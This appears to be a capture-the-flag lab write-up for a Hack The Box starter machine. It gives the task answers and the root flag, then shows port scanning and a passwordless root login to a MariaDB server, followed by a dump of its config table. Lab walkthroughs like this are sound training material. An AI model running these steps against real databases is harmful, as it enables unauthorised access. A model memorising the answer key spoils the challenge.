# Tasks
- During our scan, which port do we find serving MySQL?
	- 3306
- What community-developed MySQL version is the target running?
	- MariaDB
- When using the MySQL command line client, what switch do we need to use in order to specify a login username?
	- -u
- Which username allows us to log into this MariaDB instance without providing a password?
	- root
- In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
	- *
- In SQL, what symbol do we need to end each query with?
	- ;
- There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
	- htb
- Submit root flag
	- 7b4bec00d1a39e3dd4e021ec3d915da8


# Steps
- First, let's see what rustscan finds about the machine.
```
rustscan --ulimit 5000 --addresses "10.129.1.155" --top -- -sC -sV
```
- Looks like only one port is open, running a MySQL database.
```
PORT     STATE SERVICE REASON         VERSION  
3306/tcp open  mysql?  syn-ack ttl 63  
| mysql-info:    
|   Protocol: 10  
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1  
|   Thread ID: 66  
|   Capabilities flags: 63486  
|   Some Capabilities: LongColumnFlag, FoundRows, Speaks41ProtocolNew, InteractiveClient, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBC  
Client, SupportsCompression, ConnectWithDatabase, Support41Auth, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments  
|   Status: Autocommit  
|   Salt: 6A$.\bZ|#4z.sz-jS?!&  
|_  Auth Plugin Name: mysql_native_password
```
- So, we can take advantage of the mysql command to connect into the database
```
mysql -h 10.129.1.155 -u root
```
- After establishing a connection, we are then able to see what databases are running on this instance
```
  
MariaDB [(none)]> SHOW databases;  
+--------------------+  
| Database           |  
+--------------------+  
| htb                |  
| information_schema |  
| mysql              |  
| performance_schema |  
+--------------------+  
4 rows in set (0.084 sec)
```
- We have a htb database, so let's select that and see what tables we are dealing with:
```
MariaDB [(none)]> USE htb;  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
MariaDB [htb]> SHOW tables;  
+---------------+  
| Tables_in_htb |  
+---------------+  
| config        |  
| users         |  
+---------------+  
2 rows in set (0.079 sec)
```
- The config table is super interesting, so let's go ahead and dump all the entries within that table
```
SELECT* FROM config;
```
- From here, we can get the flag!
```
MariaDB [htb]> SELECT* FROM config;  
+----+-----------------------+----------------------------------+  
| id | name                  | value                            |  
+----+-----------------------+----------------------------------+  
|  1 | timeout               | 60s                              |  
|  2 | security              | default                          |  
|  3 | auto_logon            | false                            |  
|  4 | max_size              | 2M                               |  
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |  
|  6 | enable_uploads        | false                            |  
|  7 | authentication_method | radius                           |  
+----+-----------------------+----------------------------------+  
7 rows in set (0.086 sec)
```
